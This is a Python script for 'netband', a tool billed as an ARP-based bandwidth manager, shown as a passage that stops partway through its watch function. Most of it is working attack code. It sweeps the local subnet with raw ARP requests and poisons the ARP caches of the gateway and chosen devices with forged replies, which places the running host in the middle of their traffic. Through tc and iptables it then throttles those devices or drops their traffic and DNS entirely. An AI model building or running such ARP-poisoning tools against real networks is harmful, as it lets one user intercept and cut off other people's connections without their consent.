#!/usr/bin/env python3
"""
netband - ARP-based local network bandwidth manager.
Usage: sudo netband [-i IFACE] [-g GW_IP] [-m GW_MAC] [--colorless] [-f]
"""

import os, sys, re, time, json, signal, argparse, threading, struct, select
import socket as _socket
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor

IS_ANDROID = os.path.exists("/system/build.prop") or "ANDROID_ROOT" in os.environ

# Lazy scapy check / import to save ~500ms on startup and keep memory light
SCAPY_OK = False
def _try_scapy():
    global SCAPY_OK
    if IS_ANDROID:
        return False
    try:
        _stderr = sys.stderr
        sys.stderr = open(os.devnull, 'w')
        from scapy.all import ARP, Ether, sendp, sr1
        import warnings; warnings.filterwarnings("ignore")
        SCAPY_OK = True
        return True
    except Exception:
        SCAPY_OK = False
        return False
    finally:
        try:
            sys.stderr.close()
            sys.stderr = _stderr
        except Exception:
            pass

BROADCAST = "ff:ff:ff:ff:ff:ff"
VERSION = "1.3-fast"
TOOL_NAME = "netband"

# â”€â”€ config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

CONFIG_DIR = Path.home() / ".netctl"
DEVICES_FILE = CONFIG_DIR / "devices.json"
WATCH_FILE = CONFIG_DIR / "watch.json"

TC = "tc"
IPT = "iptables"
SYSCTL = "sysctl"
ARPING = "arping"
IP_FWD = "net.ipv4.ip_forward"

if IS_ANDROID:
    def find_bin(name):
        paths = [
            f"/data/data/com.termux/files/usr/bin/{name}",
            f"/data/data/com.termux/files/usr/bin/applets/{name}",
            f"/system/bin/{name}",
            f"/system/xbin/{name}",
            f"/vendor/bin/{name}",
        ]
        for p in paths:
            if os.path.exists(p): return p
        return name
    TC = find_bin("tc")
    IPT = find_bin("iptables")
    SYSCTL = find_bin("sysctl")
    ARPING = find_bin("arping")

# â”€â”€ colors â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class C:
    RST="\033[0m"; RED="\033[91m"; GRN="\033[92m"; YEL="\033[93m"
    BLU="\033[94m"; CYN="\033[96m"; BLD="\033[1m"; DIM="\033[2m"
    MAG="\033[95m"

def no_color():
    for a in dir(C):
        if a.isupper(): setattr(C, a, "")

# â”€â”€ shell helpers (with cached fast paths) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def sh(cmd):
    try:
        return os.popen(cmd).read().strip()
    except Exception:
        return ""

def shq(cmd):
    try:
        os.system(cmd + " >/dev/null 2>&1")
    except Exception:
        pass

# â”€â”€ fast raw ARP & Packet Helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _mac2b(m):
    return bytes(int(x, 16) for x in m.split(":"))

def _b2mac(b):
    return ":".join(f"{x:02x}" for x in b)

def _ip2b(i):
    return _socket.inet_aton(i)

def _b2ip(b):
    return _socket.inet_ntoa(b)

def _arp_packet(eth_src, arp_src, arp_src_ip, eth_dst, arp_dst, arp_dst_ip, op=2):
    eth = _mac2b(eth_dst) + _mac2b(eth_src) + b'\x08\x06'
    arp = struct.pack("!HHBBH", 0x0001, 0x0800, 6, 4, op)
    arp += _mac2b(arp_src) + _ip2b(arp_src_ip) + _mac2b(arp_dst) + _ip2b(arp_dst_ip)
    return eth + arp

def _send_raw_arp(iface, pkt):
    try:
        s = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW, _socket.htons(0x0806))
        s.bind((iface, 0))
        s.send(pkt)
        s.close()
    except Exception:
        pass

# â”€â”€ network detection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _detect_network():
    iface, gw_ip = None, None
    # 1. Fast /proc/net/route check (zero subprocess overhead)
    try:
        if Path("/proc/net/route").exists():
            lines = Path("/proc/net/route").read_text().splitlines()
            for line in lines[1:]:
                parts = line.split()
                if len(parts) >= 3 and parts[1] == "00000000" and parts[2] != "00000000":
                    iface = parts[0]
                    gw_ip = _socket.inet_ntoa(struct.pack("<L", int(parts[2], 16)))
                    return iface, gw_ip
    except Exception:
        pass

    out = sh("ip route 2>/dev/null")
    for line in out.splitlines():
        m = re.search(r"default\s+via\s+([0-9\.]+)\s+dev\s+(\S+)", line)
        if m: return m.group(2), m.group(1)

    if IS_ANDROID:
        out = sh("dumpsys connectivity 2>/dev/null")
        m = re.search(r"0\.0\.0\.0/0\s*->\s*([0-9\.]+)\s+(\S+)", out)
        if m: return m.group(2), m.group(1)
        out = sh("dumpsys wifi 2>/dev/null")
        m_gw = re.search(r"(?i)gateway[:=]\s*([0-9\.]+)", out)
        if m_gw: gw_ip = m_gw.group(1)
        iface = sh("getprop wifi.interface 2>/dev/null").strip() or iface

    return iface, gw_ip

def detect_iface():
    i, _ = _detect_network()
    return i

def get_local_ip(iface):
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        pass
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)", sh(f"ip -4 addr show dev {iface} 2>/dev/null"))
    return m.group(1) if m else None

def detect_gw(iface=None):
    _, g = _detect_network()
    if g: return g
    if iface:
        loc = get_local_ip(iface)
        if loc:
            net = ".".join(loc.split(".")[:3])
            for last in ["1", "254", "0"]:
                test_gw = f"{net}.{last}"
                if test_gw != loc and os.system(f"ping -c 1 -W 1 {test_gw} >/dev/null 2>&1") == 0:
                    return test_gw
            return f"{net}.1"
    return None

def get_local_mac(iface):
    """Get local MAC with multiple fast fallbacks."""
    try:
        mac = Path(f"/sys/class/net/{iface}/address").read_text().strip().lower()
        if mac and mac != "00:00:00:00:00:00" and ":" in mac:
            return mac
    except Exception:
        pass
    m = re.search(r"link/ether\s+([0-9a-fA-F:]{17})", sh(f"ip link show {iface} 2>/dev/null"))
    if m: return m.group(1).lower()
    return "00:00:00:00:00:00"

def get_mac(ip, iface=None):
    # 1. Trigger ARP in kernel cache via lightweight UDP touch
    try:
        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.settimeout(0.05)
        s.sendto(b"\x00", (ip, 1))
        s.close()
    except Exception:
        pass

    # 2. Direct /proc/net/arp check (fastest, no subprocess)
    try:
        if Path("/proc/net/arp").exists():
            for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
                parts = line.split()
                if len(parts) >= 4 and parts[0] == ip:
                    mac = parts[3].lower()
                    if mac != "00:00:00:00:00:00" and ":" in mac:
                        return mac
    except Exception:
        pass

    # 3. ip neigh
    out = sh(f"ip neigh show {ip} 2>/dev/null")
    m = re.search(r"lladdr\s+([0-9a-fA-F:]{17})", out)
    if m: return m.group(1).lower()

    # 4. arping fallback
    iface_flag = f"-I {iface}" if iface else ""
    out2 = sh(f"{ARPING} -c 1 -w 1 -f {iface_flag} {ip} 2>/dev/null")
    m2 = re.search(r"\[([0-9a-fA-F:]{17})\]", out2)
    if m2: return m2.group(1).lower()

    if SCAPY_OK:
        try:
            from scapy.all import ARP, sr1
            r = sr1(ARP(op=1, pdst=ip), timeout=0.5, verbose=0)
            if r: return r.hwsrc.lower()
        except Exception:
            pass
    return None

def get_subnet(iface):
    m = re.search(r"inet\s+(\d+\.\d+\.\d+\.\d+)/(\d+)", sh(f"ip -4 addr show dev {iface} 2>/dev/null"))
    if not m: return None, None
    return m.group(1), int(m.group(2))

# â”€â”€ hostname resolution (ultra-fast & cached) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

_HOSTNAME_CACHE = {}

def _resolve_mdns(ip, timeout=0.25):
    """Query mDNS (224.0.0.251:5353) for .local hostname."""
    try:
        rev = ".".join(reversed(ip.split("."))) + ".in-addr.arpa"
        name_parts = rev.encode().split(b".")
        header = b"\x00\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00"
        qname = b"".join(bytes([len(part)]) + part for part in name_parts) + b"\x00"
        query = header + qname + b"\x00\x0c\x00\x01"

        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.setsockopt(_socket.SOL_SOCKET, _socket.SO_REUSEADDR, 1)
        s.sendto(query, (ip, 5353))
        data, _ = s.recvfrom(512)
        s.close()

        idx = 12 + len(qname) + 4
        if idx >= len(data): return None
        i = idx
        while i < len(data):
            ll = data[i]
            if ll == 0: i += 1; break
            if ll & 0xc0 == 0xc0: i += 2; break
            i += 1 + ll
        i += 10
        if i >= len(data): return None

        name = []
        while i < len(data):
            ll = data[i]
            if ll == 0: break
            if ll & 0xc0 == 0xc0:
                ptr = ((ll & 0x3f) << 8) | data[i+1]
                j = ptr
                while j < len(data):
                    l2 = data[j]
                    if l2 == 0: break
                    name.append(data[j+1:j+1+l2].decode(errors="ignore"))
                    j += 1 + l2
                break
            name.append(data[i+1:i+1+ll].decode(errors="ignore"))
            i += 1 + ll

        result = ".".join(name).rstrip(".")
        if result and not result.endswith("in-addr.arpa"):
            return result
    except Exception:
        pass
    return None

def _resolve_netbios(ip, timeout=0.25):
    """Query NetBIOS Name Service (UDP 137) for Windows/Samba hostnames."""
    try:
        raw_name = b"\x20" + b"CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + b"\x00"
        query = b"\xab\xcd\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00" + raw_name + b"\x00\x21\x00\x01"

        s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
        s.settimeout(timeout)
        s.sendto(query, (ip, 137))
        data, _ = s.recvfrom(1024)
        s.close()

        if len(data) < 57: return None
        num = data[56]
        for i in range(num):
            offset = 57 + i * 18
            if offset + 15 > len(data): break
            name = data[offset:offset+15].decode("ascii", errors="ignore").strip()
            ntype = data[offset+15]
            if ntype == 0x00 and name and name != "\x00" * 15:
                return name.strip()
    except Exception:
        pass
    return None

def _resolve_rdns(ip, timeout=0.25):
    """Standard reverse DNS."""
    try:
        _socket.setdefaulttimeout(timeout)
        result = _socket.gethostbyaddr(ip)[0]
        _socket.setdefaulttimeout(None)
        return result if result != ip else None
    except Exception:
        return None

def resolve_hostname(ip, timeout=0.3):
    if ip in _HOSTNAME_CACHE:
        return _HOSTNAME_CACHE[ip]

    res = _resolve_mdns(ip, timeout) or _resolve_netbios(ip, timeout) or _resolve_rdns(ip, timeout) or ""
    _HOSTNAME_CACHE[ip] = res
    return res

def resolve_hostnames_bulk(ip_list, timeout=0.35, max_workers=50):
    """High-concurrency parallel hostname resolver using ThreadPoolExecutor."""
    results = {}
    with ThreadPoolExecutor(max_workers=min(max_workers, len(ip_list) or 1)) as executor:
        future_to_ip = {executor.submit(resolve_hostname, ip, timeout): ip for ip in ip_list}
        for future in future_to_ip:
            ip = future_to_ip[future]
            try:
                results[ip] = future.result()
            except Exception:
                results[ip] = ""
    return results

def parse_rate(s):
    s = s.strip().lower()
    m = re.match(r"^(\d+(?:\.\d+)?)\s*(bit|kbit|mbit|gbit|kbps|mbps|gbps)?$", s)
    if not m: return None
    val = float(m.group(1))
    u = m.group(2) or "kbit"
    conv = {"kbps":"kbit","mbps":"mbit","gbps":"gbit"}
    return f"{val}{conv.get(u, u)}"

def _fmt(b):
    for u in ["B","KB","MB","GB"]:
        if abs(b) < 1024: return f"{b:.1f}{u}"
        b /= 1024
    return f"{b:.1f}TB"

# â”€â”€ store â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def load(p):
    try:
        return json.loads(p.read_text()) if p.exists() else {}
    except Exception:
        return {}

def save(p, d):
    try:
        CONFIG_DIR.mkdir(exist_ok=True)
        p.write_text(json.dumps(d, indent=2))
    except Exception:
        pass

# â”€â”€ direction helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class Dir:
    NONE=0; UP=1; DOWN=2; BOTH=3
    @staticmethod
    def from_args(words):
        if "--upload" in words: return Dir.UP
        if "--download" in words: return Dir.DOWN
        return Dir.BOTH
    @staticmethod
    def name(d):
        return {1:"upload",2:"download",3:"both"}.get(d,"-")
    @staticmethod
    def icon(d):
        return {1:"\u2191", 2:"\u2193", 3:"\u2195"}.get(d, "-")

# â”€â”€ ARP spoofer â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class Spoofer:
    def __init__(self, iface, gw_ip, gw_mac):
        self.iface = iface
        self.gw_ip = gw_ip
        self.gw_mac = gw_mac
        self.local_ip = get_local_ip(iface)
        self.local_mac = get_local_mac(iface)
        self._targets = {}
        self._lock = threading.Lock()
        self._running = False
        self._thread = None
        self._fwd_orig = None

    def _start_thread(self):
        if self._running: return
        self._running = True
        self._fwd_orig = sh(f"{SYSCTL} -n {IP_FWD}")
        shq(f"{SYSCTL} -w {IP_FWD}=1")
        self._thread = threading.Thread(target=self._loop, daemon=True)
        self._thread.start()

    def _loop(self):
        while self._running:
            with self._lock:
                targets = dict(self._targets)
            for ip, mac in targets.items():
                if not self._running: return
                self._send_spoof(ip, mac)
            time.sleep(2)

    def _send_spoof(self, ip, mac):
        if SCAPY_OK:
            try:
                from scapy.all import ARP, Ether, sendp
                sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, pdst=self.gw_ip, hwdst=self.gw_mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
                sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, pdst=ip, hwdst=mac, hwsrc=self.local_mac), verbose=0, iface=self.iface)
                return
            except Exception:
                pass
        _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, self.gw_ip, mac, mac, ip, op=2))
        _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.local_mac, ip, self.gw_mac, self.gw_mac, self.gw_ip, op=2))

    def add(self, ip, mac):
        with self._lock:
            if ip in self._targets: return
            self._targets[ip] = mac
        self._start_thread()

    def remove(self, ip):
        with self._lock:
            mac = self._targets.pop(ip, None)
        if mac: self._restore(ip, mac)
        with self._lock:
            if not self._targets: self._stop()

    def _stop(self):
        self._running = False
        def delayed_stop():
            time.sleep(1.5)
            with self._lock:
                if not self._targets:
                    shq(f"{SYSCTL} -w {IP_FWD}={self._fwd_orig or '0'}")
                    shq("conntrack -F 2>/dev/null")
        threading.Thread(target=delayed_stop, daemon=True).start()

    def _restore(self, ip, mac):
        for _ in range(3):
            if SCAPY_OK:
                try:
                    from scapy.all import ARP, Ether, sendp
                    sendp(Ether(dst=self.gw_mac)/ARP(op=2, psrc=ip, hwsrc=mac, pdst=self.gw_ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
                    sendp(Ether(dst=mac)/ARP(op=2, psrc=self.gw_ip, hwsrc=self.gw_mac, pdst=ip, hwdst=BROADCAST), verbose=0, iface=self.iface)
                    time.sleep(0.05)
                    continue
                except Exception:
                    pass
            _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, mac, BROADCAST, ip, op=2))
            _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, self.gw_mac, BROADCAST, self.gw_ip, op=2))
            _send_raw_arp(self.iface, _arp_packet(self.local_mac, self.gw_mac, self.gw_ip, BROADCAST, BROADCAST, ip, op=2))
            _send_raw_arp(self.iface, _arp_packet(self.local_mac, mac, ip, BROADCAST, BROADCAST, self.gw_ip, op=2))
            time.sleep(0.05)

    def restore_all(self):
        with self._lock:
            targets = dict(self._targets)
            self._targets.clear()
        for ip, mac in targets.items():
            self._restore(ip, mac)
        self._stop()

    @property
    def count(self):
        with self._lock: return len(self._targets)

# â”€â”€ tc + iptables limiter â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

class Limiter:
    def __init__(self, iface):
        self.iface = iface
        self._hosts = {}
        self._lock = threading.Lock()
        self._id_counter = 0

    def _next_id(self):
        self._id_counter += 1
        return self._id_counter

    def _ensure_root(self):
        if "htb" not in sh(f"{TC} qdisc show dev {self.iface}"):
            shq(f"{TC} qdisc add dev {self.iface} root handle 1:0 htb")

    def limit(self, ip, rate, direction):
        self._ensure_root()
        with self._lock:
            if ip in self._hosts: self._unlimit(ip)
            ids = {"uid": self._next_id(), "did": self._next_id()}
            self._hosts[ip] = {"ids": ids, "rate": rate, "dir": direction, "blocked": False}
        if direction & Dir.UP:
            uid = ids["uid"]
            shq(f"{TC} class add dev {self.iface} parent 1:0 classid 1:{uid} htb rate {rate} burst {rate}")
            shq(f"{TC} filter add dev {self.iface} parent 1:0 protocol ip prio {uid} handle {uid} fw flowid 1:{uid}")
            shq(f"{IPT} -t mangle -A POSTROUTING -s {ip} -j MARK --set-mark {uid}")
        if direction & Dir.DOWN:
            did = ids["did"]
            shq(f"{TC} class add dev {self.iface} parent 1:0 classid 1:{did} htb rate {rate} burst {rate}")
            shq(f"{TC} filter add dev {self.iface} parent 1:0 protocol ip prio {did} handle {did} fw flowid 1:{did}")
            shq(f"{IPT} -t mangle -A PREROUTING -d {ip} -j MARK --set-mark {did}")

    def block(self, ip, direction):
        self._ensure_root()
        with self._lock:
            if ip in self._hosts: self._unlimit(ip)
            ids = {"uid": self._next_id(), "did": self._next_id()}
            self._hosts[ip] = {"ids": ids, "rate": None, "dir": direction, "blocked": True}
        if direction & Dir.UP:
            shq(f"{IPT} -I FORWARD -s {ip} -j DROP")
            shq(f"{IPT} -I OUTPUT -s {ip} -j DROP")
        if direction & Dir.DOWN:
            shq(f"{IPT} -I FORWARD -d {ip} -j DROP")
            shq(f"{IPT} -I INPUT -d {ip} -j DROP")
        shq(f"{IPT} -I FORWARD -s {ip} -p udp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -d {ip} -p udp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -s {ip} -p tcp --dport 53 -j DROP")
        shq(f"{IPT} -I FORWARD -d {ip} -p tcp --dport 53 -j DROP")

    def unlimit(self, ip):
        with self._lock: self._unlimit(ip)

    def _unlimit(self, ip):
        info = self._hosts.pop(ip, None)
        if not info: return
        ids, direction = info["ids"], info["dir"]
        if info["rate"] is not None:
            if direction & Dir.UP:
                shq(f"{TC} filter del dev {self.iface} parent 1:0 prio {ids['uid']}")
                shq(f"{TC} class del dev {self.iface} parent 1:0 classid 1:{ids['uid']}")
                shq(f"{IPT} -t mangle -D POSTROUTING -s {ip} -j MARK --set-mark {ids['uid']}")
            if direction & Dir.DOWN:
                shq(f"{TC} filter del dev {self.iface} parent 1:0 prio {ids['did']}")
                shq(f"{TC} class del dev {self.iface} parent 1:0 classid 1:{ids['did']}")
                shq(f"{IPT} -t mangle -D PREROUTING -d {ip} -j MARK --set-mark {ids['did']}")
        else:
            if direction & Dir.UP:
                shq(f"{IPT} -D FORWARD -s {ip} -j DROP")
                shq(f"{IPT} -D OUTPUT -s {ip} -j DROP")
            if direction & Dir.DOWN:
                shq(f"{IPT} -D FORWARD -d {ip} -j DROP")
                shq(f"{IPT} -D INPUT -d {ip} -j DROP")
            shq(f"{IPT} -D FORWARD -s {ip} -p udp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -d {ip} -p udp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -s {ip} -p tcp --dport 53 -j DROP")
            shq(f"{IPT} -D FORWARD -d {ip} -p tcp --dport 53 -j DROP")

    def replace(self, old_ip, new_ip):
        with self._lock: info = self._hosts.get(old_ip)
        if not info: return
        rate, direction = info["rate"], info["dir"]
        self.unlimit(old_ip)
        if rate is None: self.block(new_ip, direction)
        else: self.limit(new_ip, rate, direction)

    def get_rate(self, ip):
        with self._lock: return self._hosts.get(ip, {}).get("rate")

    def is_blocked(self, ip):
        with self._lock: return self._hosts.get(ip, {}).get("blocked", False)

    def is_limited(self, ip):
        with self._lock: return ip in self._hosts

    def get_status(self, ip):
        with self._lock: return self._hosts.get(ip)

    def flush(self):
        shq(f"{TC} qdisc del dev {self.iface} root")
        shq(f"{IPT} -t mangle -F")
        shq(f"{IPT} -t filter -F FORWARD")
        shq(f"{IPT} -P FORWARD ACCEPT")

    @property
    def count(self):
        with self._lock: return len(self._hosts)

# â”€â”€ 10x FAST SCANNER â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def _build_ip_list(gw_ip, custom=None):
    """Build list of IPs to scan."""
    if custom:
        parts = custom.split("-")
        start, end = parts[0].strip(), parts[1].strip()
        if "." not in end:
            end = ".".join(start.split(".")[:-1]) + "." + end
        s, e = list(map(int, start.split("."))), list(map(int, end.split(".")))
        ips = []
        for a in range(s[0], e[0]+1):
            for b in range(s[1] if a==s[0] else 0, e[1]+1 if a==e[0] else 255):
                for c in range(s[2] if a==s[0] and b==s[1] else 0, e[2]+1 if a==e[0] and b==e[1] else 255):
                    for d in range(s[3] if a==s[0] and b==s[1] and c==s[2] else 1, e[3]+1 if a==e[0] and b==e[1] and c==e[2] else 255):
                        ips.append(f"{a}.{b}.{c}.{d}")
        return ips
    net = ".".join(gw_ip.split(".")[:3])
    return [f"{net}.{i}" for i in range(1, 255)]

def _fast_socket_ping_blast(ips):
    """Lightweight zero-fork socket probe to immediately populate kernel ARP table."""
    def _probe(ip):
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            s.settimeout(0.01)
            s.sendto(b"\x00", (ip, 1))
            s.close()
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=64) as executor:
        list(executor.map(_probe, ips))

def _read_all_neigh(iface):
    """Combine direct /proc/net/arp and ip neigh for 100% discovery rate."""
    result = {}
    # 1. /proc/net/arp (Fastest, direct from kernel memory)
    try:
        if Path("/proc/net/arp").exists():
            for line in Path("/proc/net/arp").read_text().splitlines()[1:]:
                p = line.split()
                if len(p) >= 6 and (p[5] == iface or not iface):
                    ip, mac = p[0], p[3].lower()
                    if mac != "00:00:00:00:00:00" and ":" in mac:
                        result[ip] = mac
    except Exception:
        pass

    # 2. ip neigh
    try:
        for line in sh(f"ip neigh show dev {iface}").splitlines():
            p = line.split()
            if len(p) < 4: continue
            ip = p[0]
            try:
                ll_idx = p.index("lladdr")
                mac = p[ll_idx + 1].lower()
            except (ValueError, IndexError):
                continue
            if mac == "00:00:00:00:00:00" or ":" not in mac: continue
            state = p[-1].upper() if p else ""
            if state in ("FAILED", "INCOMPLETE"): continue
            result[ip] = mac
    except Exception:
        pass

    return result

def scan(iface, gw_ip, custom=None, limiter=None, spoofer=None, gw_mac=None):
    ips = _build_ip_list(gw_ip, custom)
    target_ip_set = set(ips)

    print(f"{C.DIM}âš¡ Fast scanning {len(ips)} addresses...{C.RST}")

    local_ip = (spoofer.local_ip if spoofer else None) or get_local_ip(iface)
    local_mac = (spoofer.local_mac if spoofer else None) or get_local_mac(iface)

    discovered = {}
    raw_sock = None

    # Setup direct raw ARP listener if permissions allow
    try:
        raw_sock = _socket.socket(_socket.AF_PACKET, _socket.SOCK_RAW, _socket.htons(0x0806))
        raw_sock.bind((iface, 0))
        raw_sock.setblocking(False)
    except Exception:
        raw_sock = None

    def _listen_arp(timeout_sec=0.5):
        if not raw_sock: return
        start = time.time()
        while time.time() - start < timeout_sec:
            r, _, _ = select.select([raw_sock], [], [], 0.05)
            if not r: continue
            try:
                while True:
                    packet, _ = raw_sock.recvfrom(2048)
                    if len(packet) < 42: continue
                    # Check ARP reply (op == 2) or request (op == 1)
                    arp_type = struct.unpack("!H", packet[12:14])[0]
                    if arp_type != 0x0806: continue
                    op = struct.unpack("!H", packet[20:22])[0]
                    src_mac = _b2mac(packet[22:28])
                    src_ip = _b2ip(packet[28:32])
                    if src_ip in target_ip_set and src_mac != "00:00:00:00:00:00" and ":" in src_mac:
                        discovered[src_ip] = src_mac
            except (BlockingIOError, _socket.error):
                pass

    # Phase 1: High-Speed Async Raw ARP Blast
    if local_mac and local_ip and local_mac != "00:00:00:00:00:00":
        # Launch background listener thread
        listener_thread = threading.Thread(target=_listen_arp, args=(0.6,), daemon=True)
        listener_thread.start()

        for idx, ip in enumerate(ips):
            pkt = _arp_packet(local_mac, local_mac, local_ip, BROADCAST, BROADCAST, ip, op=1)
            _send_raw_arp(iface, pkt)
            if idx % 80 == 79:
                time.sleep(0.002)

        # Micro UDP probe batch to ensure kernel ARP cache warm-up
        _fast_socket_ping_blast(ips)
        listener_thread.join(timeout=0.8)
    else:
        _fast_socket_ping_blast(ips)
        time.sleep(0.3)

    if raw_sock:
        try: raw_sock.close()
        except Exception: pass

    # Read kernel neighbor & proc tables
    neigh = _read_all_neigh(iface)
    for ip, mac in neigh.items():
        if ip in target_ip_set:
            discovered[ip] = mac

    # Load existing saved devices
    devices = load(DEVICES_FILE)
    active_devices = {}

    # Preserve status of limited hosts even if offline
    for mac, d in devices.items():
        if limiter and limiter.is_limited(d.get("ip", "")):
            d["online"] = False
            active_devices[mac] = d

    # Process all discovered online hosts
    seen_macs = set()
    for ip, mac in discovered.items():
        if mac in seen_macs: continue
        seen_macs.add(mac)

        if mac in active_devices:
            active_devices[mac]["ip"] = ip
            active_devices[mac]["online"] = True
        elif mac in devices:
            active_devices[mac] = dict(devices[mac])
            active_devices[mac]["ip"] = ip
            active_devices[mac]["online"] = True
        else:
            active_devices[mac] = {
                "id": -1, "ip": ip, "mac": mac,
                "hostname": "", "limits": {}, "online": True
            }

    # Parallel hostname resolution for hosts that need names
    need_resolve = [
        d["ip"] for d in active_devices.values()
        if d.get("online") and not d.get("hostname")
    ]
    if need_resolve:
        resolved = resolve_hostnames_bulk(need_resolve, timeout=0.25)
        for d in active_devices.values():
            ip = d["ip"]
            if ip in resolved and resolved[ip]:
                d["hostname"] = resolved[ip]

    # Ensure gateway is always present
    if gw_mac:
        gw_mac_lower = gw_mac.lower()
        if gw_mac_lower not in active_devices:
            if gw_mac_lower in devices:
                active_devices[gw_mac_lower] = dict(devices[gw_mac_lower])
                active_devices[gw_mac_lower]["ip"] = gw_ip
                active_devices[gw_mac_lower]["online"] = True
            else:
                active_devices[gw_mac_lower] = {
                    "id": 0, "ip": gw_ip, "mac": gw_mac_lower,
                    "hostname": "gateway", "limits": {}, "online": True
                }

    # Separate gateway for pinning to ID 0
    gw_device = None
    if gw_mac:
        gw_device = active_devices.pop(gw_mac.lower(), None)
    else:
        for mac, d in list(active_devices.items()):
            if d["ip"] == gw_ip:
                gw_device = active_devices.pop(mac)
                break

    def ip_key(item):
        try: return list(map(int, item[1]["ip"].split(".")))
        except Exception: return [999, 999, 999, 999]

    sorted_non_gw = sorted(active_devices.items(), key=ip_key)

    rebuilt_devices = {}
    if gw_device:
        gw_device["id"] = 0
        if not gw_device["hostname"] or gw_device["hostname"] in ("", gw_ip):
            gw_device["hostname"] = "gateway"
        rebuilt_devices[gw_device["mac"]] = gw_device
    elif gw_mac:
        rebuilt_devices[gw_mac.lower()] = {
            "id": 0, "ip": gw_ip, "mac": gw_mac.lower(),
            "hostname": "gateway", "limits": {}, "online": True
        }

    for idx, (mac, d) in enumerate(sorted_non_gw, start=1):
        d["id"] = idx
        rebuilt_devices[mac] = d

    save(DEVICES_FILE, rebuilt_devices)
    return rebuilt_devices

# â”€â”€ watch â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€

def watch_check(iface, watchlist, devices, gw_ip):
    net = ".".join(gw_ip.split(".")[:3])
    ips = [f"{net}.{i}" for i in range(1, 255)]
    _fast_socket_ping_blast(ips)
    changes = []
    neigh = _read_all_neigh(iface)
    for mac in list(watchlist.get("hosts", [])):
        if mac not in devices: continue
        dev = devices[mac]
        old_ip = dev["ip"]
